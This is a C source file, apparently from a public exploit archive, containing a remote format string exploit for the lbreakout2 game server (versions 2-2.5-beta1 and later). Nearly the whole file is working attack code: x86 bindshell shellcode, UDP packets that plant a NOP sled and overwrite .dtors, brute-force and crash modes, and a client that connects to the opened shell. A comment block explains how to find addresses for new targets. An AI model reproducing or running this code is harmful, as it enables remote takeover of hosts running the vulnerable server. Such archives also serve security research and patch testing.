/*
source: http://www.securityfocus.com/bid/8021/info

It has been reported that lbreakout2 is vulnerable to a format string issue in the login component. This may result in an attacker executing arbitrary code on a vulnerable host.
*/

/*[ lbreakout[2-2.5+]: remote format string exploit. ]*
 * (only v2-2.5-beta1, or greater versions affected)  *
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)   *
 *                                                    *
 * lbreakout(2) is a common SDL game included, in at  *
 * least packaged form for many linux distributions.  *
 * it can be found on:                                *
 *  http://www.freshmeat.net/projects/lbreakout       *
 *  http://lgames.sourceforge.net                     *
 *                                                    *
 * there exists multiple format string bugs within    *
 * both the client, and the server.  these bugs are   *
 * in the form of snprintf(buf1,len,buf2);            *
 *                                                    *
 * this exploit takes advantage of the initial        *
 * login request, found in server/server.c:           *
 *  446:snprintf( name, 20, msg_read_string() );      *
 *  (the size limit(20) does not make a difference)   *
 *                                                    *
 * the shellcode is placed in net_buffer(1024), in    *
 * memory.  which is used for all initial udp socket  *
 * reading, but is not cleared.  so, the exploit      *
 * works like so: send shellcode(1024 bytes).  then,  *
 * send the format string buffer(64 bytes).  so, the  *
 * events look like:                                  *
 *                                                    *
 *  first packet:                                     *
 *   [1024 bytes (nops+shellcode)]                    *
 *  second packet:                                    *
 *   [64 bytes (format string)]                       *
 *  so, net_buffer(1024) will look like:              *
 *   [64 bytes][960 bytes (original shellcode)]       *
 * (only thing the format string buffer overwrites    *
 * are nops)                                          *
 *                                                    *
 * if you want to add to the platform list, simply    *
 * do as followed:                                    *
 *  ./xlbs -h <hostname> -g                           *
 *                                                    *
 * take the "(true)" pop value given.  now you have   *
 * the pop value to use.                              *
 *                                                    *
 * then, do: objdump -sj.dtors \                      *
 *           /path/to/lbreakout2server                *
 *                                                    *
 * then, take the address given, and add 4 bytes.     *
 * now you have the .dtors address to use.            *
 *                                                    *
 * then, do: objdump -x /path/to/lbreakout2server | \ *
 *           grep net_buffer | grep -v cur_size       *
 *                                                    *
 * then, take the address given, and add ~200 bytes.  *
 * now you have the return address to use.  add ~200  *
 * bytes because it's a shared buffer, and can get    *
 * overwritten by other users, or yourself.  it's     *
 * not likely for a legit packet to be over ~200      *
 * bytes.  the minimum is +64(FMTSIZE) bytes.         *
 *                                                    *
 * i recommend when testing this exploit, using the   *
 * brute force option.  ie: "./xlbs -h host.com -b",  *
 * or using an offset of 24("-d 6"), for .dtors.      *
 *                                                    *
 * also, for when lbreakout2server/lbreakout2 is      *
 * setgid games.  the -D, and -a command line         *
 * arguments both use the same snprintf() method.     *
 * which can also be exploited locally.               *
 ******************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define CODESIZE 1024 /* 1024 = net_buffer size. */
#define FMTSIZE 64 /* format buffer size. */
#define TIMEOUT 10 /* socket timeouts. */
static char x86_exec[]= /* bindshell(12800), netric. */
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51"
 "\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd"
 "\x80\xb3\x02\xb1\x02\x31\xc9\x51\x51\x51\x80\xc1\x32"
 "\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24\xb2\x10\x52\x51"
 "\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3"
 "\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03"
 "\xcd\x80\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0"
 "\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
 "\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd"
 "\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
 "\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c"
 "\x24\x31\xc0\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
struct platform {
 unsigned int pops;
 unsigned long dtors_addr;
 unsigned long ret_addr;
};
struct platform target[]={
 /* { pops,(.dtors addr+4),(net_buffer addr+200). } */
 /* 2-2.5-beta1 source, on redhat7.1. */
 { 14,(0x805b0ec+4),(0x0807c940+200) },
 /* 2-2.5-beta2 source, on redhat7.1. */
 { 14,(0x805b16c+4),(0x0807c9c0+200) },
 /* put more platforms here. */
 { 0,0,0 }
};
unsigned short pt=0; /* default platform. */
char *send_packet(char *,unsigned short,char *,
unsigned int,unsigned short);
char *getfmt(int,int,unsigned int);
char *getcode(void);
void getshell(char *,unsigned short);
void getpops(char *hostname,unsigned short port);
void sendcode(char *,unsigned short,int,int,
unsigned int);
void printe(char *,short);
void usage(char *);
void sig_alarm(){printe("alarm signal/timeout",1);}
int main(int argc,char **argv){
 unsigned short port=8000; /* default. */
 unsigned short getpop=0;
 unsigned short brute=0;
 unsigned short crash=0;
 int doffset=0;
 int roffset=0;
 int pops=0;
 int chr=0;
 char *hostname=0;
 while((chr=getopt(argc,argv,"t:h:p:d:r:P:gbc"))!=EOF){
  switch(chr){
   case 't':
    /* change this if more platforms are added. */
    if(atoi(optarg)<0||atoi(optarg)>1)
     usage(argv[0]);
    pt=atoi(optarg);
    break;
   case 'h':
    if(!hostname&&!(hostname=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);
    break;
   case 'p':
    port=atoi(optarg);
    break;
   case 'd':
    doffset=(atoi(optarg)*4);
    break;
   case 'r':
    roffset=atoi(optarg);
    break;
   case 'P':
    pops=atoi(optarg);
    break;
   case 'g':
    getpop=1;
    break;
   case 'b':
    brute=1;
    break;
   case 'c':
    crash=1;
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!hostname)
  usage(argv[0]);
 printf(
 "[*] lbreakout[2-2.5+]: remote format string exploit"
 ".\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakeh"
 "alo)\n\n");
 if(getpop){
  getpops(hostname,port);
  exit(0);
 }
 else if(crash){
  /* this can sometimes help to activate the code. */
  printf("[*] sending server crash code.\n");
  /* login(name,pwd) buffer prefix, pwd is ignored. */
  send_packet(hostname,port,"\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x03\x04%n",12,0);
 }
 else{
  if(brute){
   for(doffset=0;doffset<444;doffset+=4)
    sendcode(hostname,port,doffset,roffset,pops);
   printf("[!] brute force failed.\n");
  }
  else
   sendcode(hostname,port,doffset,roffset,pops);
 }
 exit(0);
}
char *send_packet(char *hostname,unsigned short port,
char *data,unsigned int len,unsigned short getreply){
 int u;
 unsigned char *buf;
 struct hostent *he;
 struct sockaddr_in sa;
 u=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
 sa.sin_family=AF_INET;
 sa.sin_port=htons(port);
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname))){
   printe("send_packet(): couldn't resolve",0);
   return("(NULL)");
  }
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 /* magic udp connection. */
 connect(u,(struct sockaddr *)&sa,sizeof(sa));
 write(u,data,len);
 if(getreply){
  if(!(buf=(char *)malloc(512+1)))
   printe("send_packet(): allocating memory failed",1);
  memset(buf,0x0,(512+1));
  if(read(u,buf,512)<1){
   close(u);
   return("(NULL)");
  }
  close(u);
  return(buf);
 }
 close(u);
 return("(NULL)");
}
char *getfmt(int doff,int roff,unsigned int pop){
 unsigned int addrl,addrh;
 unsigned int pops=(pop?pop:target[pt].pops);
 unsigned long dtors=(target[pt].dtors_addr+doff);
 unsigned long addr=((target[pt].ret_addr+roff)-1);
 char *buf;
 char taddr[3];
 taddr[0]=(dtors&0xff000000)>>24;
 taddr[1]=(dtors&0x00ff0000)>>16;
 taddr[2]=(dtors&0x0000ff00)>>8;
 taddr[3]=(dtors&0x000000ff);
 addrh=(addr&0xffff0000)>>16;
 addrl=(addr&0x0000ffff);
 if(!(buf=(char *)malloc(FMTSIZE+1)))
  printe("getfmt(): allocating memory failed",1);
 memset(buf,0x0,(FMTSIZE+1));
 /* login(name,pwd) buffer prefix, pwd is ignored. */
 memcpy(buf,"\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04"
 ,10);
 if(addrh<addrl)
  sprintf(buf+10,
  "%c%c%c%c%c%c%c%c" /* -8 bytes. */
  "%%.%dd%%%d$hn"
  "%%.%dd%%%d$hn",
  taddr[3]+2,taddr[2],taddr[1],taddr[0],
  taddr[3],taddr[2],taddr[1],taddr[0],
  (addrh-8),pops,(addrl-addrh),(pops+1));
 else
  sprintf(buf+10,
  "%c%c%c%c%c%c%c%c" /* -8 bytes. */
  "%%.%dd%%%d$hn"
  "%%.%dd%%%d$hn",
  taddr[3]+2,taddr[2],taddr[1],taddr[0],
  taddr[3],taddr[2],taddr[1],taddr[0],
  (addrl-8),(pops+1),(addrh-addrl),pops);
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(CODESIZE+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(CODESIZE-strlen(x86_exec)));
 memcpy(buf+(CODESIZE-strlen(x86_exec)),x86_exec,
 strlen(x86_exec));
 return(buf);
}
void getshell(char *hostname,unsigned short port){
 int sock,r;
 fd_set fds;
 char buf[4096];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))
 ==-1){
  printe("getshell(): socket() failed",0);
  return;
 }
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname))){
   printe("couldn't resolve",0);
   return;
  }
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 /* i'm a lazy man, sometimes. */
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] attempting to connect: %s:%d.\n",
 hostname,port);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",
  hostname,port);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",
 hostname,port);
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1){
   printe("getshell(): select() failed",0);
   return;
  }
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,sizeof(buf)))<1){
    printe("getshell(): read() failed",0);
    return;
   }
   if(write(sock,buf,r)!=r){
    printe("getshell(): write() failed",0);
    return;
   }
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,sizeof(buf)))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
/* rough/dirty, but accurate.  sends login(format) */
/* request is: "xxxx[1 char packet identity][%x]." */
void getpops(char *hostname,unsigned short port){
 unsigned int pops=0;
 char orig[4+1];
 char match[8+1];
 char *buf;
 unsigned char *reply; /* for %d of reply[17]. */
 if(!(buf=(char *)malloc(FMTSIZE+1)))
  printe("getpops(): allocating memory failed",1);
 printf("NOTE: i did not add the command to disconnec"
 "t the user.\nso, you have to wait roughly a minute "
 "before each user\n(format string placed as a user) "
 "times out.  basically,\nwait a minute in-between us"
 "ing it.  also, the packets may\nor may not come bac"
 "k in order. (or come back at all)\n\n");
 printf("[*] finding pop value: %s:%d.\n\n",hostname,
 port);
 while(pops++<255){
  memset(buf,0x0,(FMTSIZE+1));
  memcpy(buf,"\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04"
  ,10);
  /* 37=0x25='%' will get processed as a format. */
  if(pops==37)
   sprintf(buf+10,"xxxx%c%c%%%d$x%cunused%c",pops,
   pops,pops,0x0,0x0);
  else
   sprintf(buf+10,"xxxx%c%%%d$x%cunused%c",pops,
   pops,0x0,0x0);
  reply=(char *)send_packet(hostname,port,buf,
  FMTSIZE,1);
  /* proof of packet reply desired. */
  memset(orig,0x0,4+1);
  sprintf(orig,"%.4s",(reply+13));
  /* want this to be 78787878. (xxxx) */
  memset(match,0x0,8+1);
  sprintf(match,"%.8s",(reply+18));
  /* make sure its the packet desired. */
  if(strlen(match)&&strlen(orig)&&
  !strcmp("xxxx",orig)){
   if(!strcmp("78787878",match)){
    printf("%d:\t(true)\t%s\n",reply[17],match);
    printf("\n[*] the pop value is: %d.\n",pops);
    return;
   }
   else
    printf("%d:\t(false)\t%s\n",reply[17],
    strlen(match)?match:"(no data)");
  }
  usleep(100000); /* pace it. */
 }
 printf("\n[!] pop location find failed.\n");
 return;
}
void sendcode(char *hostname,unsigned short port,
int doff,int roff,unsigned int pops){
 printf("\ntarget=%s:%d pops=%d dtors=0x%.8lx(+%d)"
 " ret=0x%.8lx(+%d)\n\n",hostname,port,(pops?pops:
 target[pt].pops),target[pt].dtors_addr,doff,
 target[pt].ret_addr,roff);
 printf("[*] sending code buffer. (net_buffer)\n");
 send_packet(hostname,port,getcode(),CODESIZE,0);
 sleep(1); /* needs to be done in order. */
 printf("[*] sending format string, new .dtors.\n");
 send_packet(hostname,port,getfmt(doff,roff,pops),
 FMTSIZE,0);
 sleep(1); /* give it some time to set in. */
 getshell(hostname,12800); /* defined in shellcode. */
 return;
}
void printe(char *err,short e){
 printf("[!] error: %s.\n",err);
 if(e)
  exit(1);
 return;
}
void usage(char *name){
 printf(
 "[*] lbreakout[2-2.5+]: remote format string exploit"
 ".\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakeh"
 "alo)\n\n usage: %s [options] -h hostname\n\n option"
 "s:\n  -t <number>\tdefines the platform value.\n  -"
 "h <string>\tdefines the hostname/ip to connect to."
 "\n  -p <number>\tdefines the port to connect to.\n "
 " -d <number*4>\tdefines the offset to use. (dtors_a"
 "ddr)\n  -r <number>\tdefines the offset to use. (re"
 "t_addr)\n  -P <number>\tdefines alternate pop value"
 " to use.\n  -g\t\tdefines pop finder mode.\n  -b\t"
 "\tdefines brute force mode.\n  -c\t\tdefines server"
 " crash mode.\n\n platforms:\n  0\t\tlbreaout2server"
 " v2-2.5beta1-src on RedHat 7.1. (default)\n  1\t\tl"
 "breaout2server v2-2.5beta2-src on RedHat 7.1.\n\n",
 name);
 exit(0);
}